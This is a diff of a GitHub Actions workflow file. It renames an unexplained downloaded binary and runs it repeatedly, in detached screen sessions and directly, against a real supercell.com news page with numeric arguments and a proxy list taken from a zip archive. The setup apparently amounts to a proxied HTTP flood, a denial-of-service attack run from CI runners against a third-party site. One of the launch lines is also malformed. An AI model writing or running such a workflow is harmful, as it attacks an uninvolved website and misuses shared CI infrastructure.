@@ -34,11 +34,11 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv ki o          
+          mv tol o          
           
-          screen -dms ve ./o https://supercell.com/en/news/learning-from-failures/ 200 1 1 
-          screen -dms ve .https://supercell.com/en/news/learning-from-failures/ 200 1 1 
-          ./o https://supercell.com/en/news/learning-from-failures/ 200 1 1  
+          screen -dms ve ./o https://supercell.com/en/news/learning-from-failures/ 200 1 1 90.txt
+          screen -dms ve .https://supercell.com/en/news/learning-from-failures/ 200 1 1 90.txt
+          ./o https://supercell.com/en/news/learning-from-failures/ 200 1 1  90.txt
 
           
           sleep 1
